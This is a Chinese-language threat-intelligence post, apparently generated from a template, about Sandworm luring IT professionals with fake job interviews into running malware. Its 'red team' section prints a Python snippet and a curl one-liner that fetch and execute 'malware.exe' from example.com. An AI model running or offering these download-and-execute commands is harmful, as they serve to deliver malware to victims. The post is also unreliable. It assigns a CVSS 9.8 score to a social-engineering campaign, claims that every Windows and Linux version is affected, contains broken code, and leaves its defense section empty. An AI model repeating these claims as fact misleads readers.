# 🚨 逆向工程與威脅情報：解析 Sandworm 團隊的社交工程攻擊
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `Social Engineering`, `Phishing`, `Malware`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 攻擊者利用社交工程手法，假冒企業招募流程及工作面試，鎖定 IT 專業人士發動攻擊。這種攻擊方式利用人性的弱點，讓受害者下載惡意程式或執行特定工具，從而取得初始存取權限。
* **攻擊流程圖解**: 
    1. 攻擊者透過求職平臺或社群網站接觸目標。
    2. 攻擊者建立信任，要求受害者下載測試程式或執行特定工具。
    3. 受害者依照指示操作，惡意程式便會在電腦中執行。
    4. 攻擊者取得初始存取權限，部署後門、竊取帳號密碼及其他敏感資訊。
* **受影響元件**: 所有版本的 Windows 和 Linux 系統。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有足夠的社交工程技巧和資源。
* **Payload 建構邏輯**:

    ```
    
    python
    import os
    import subprocess
    
    # 下載惡意程式
    os.system("wget http://example.com/malware.exe")
    
    # 執行惡意程式
    subprocess.call(["malware.exe"])
    
    ```
    *範例指令*: `curl -X GET "http://example.com/malware.exe" -o malware.exe && ./malware.exe`
* **繞過技術**: 攻擊者可以使用各種繞過技術，例如使用 VPN 或 Proxy 伺服器來隱藏 IP 地址。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Social Engineering (社交工程)**: 想像一個攻擊者假冒一個信任的個體，例如一個 IT 公司的員工，來讓受害者下載惡意程式或執行特定工具。技術上是指利用人性的弱點來取得初始存取權限。
* **Phishing (釣魚攻擊)**: 想像一個攻擊者發送一個假的電子郵件，來讓受害者下載惡意程式或執行特定工具。技術上是指利用電子郵件或其他通訊工具來取得初始存取權限。
* **Malware (惡意程式)**: 想像一個攻擊者創建一個程式，來竊取帳號密碼或其他敏感資訊。技術上是指任何有害的程式，例如病毒、蠕蟲、特洛伊木馬等。
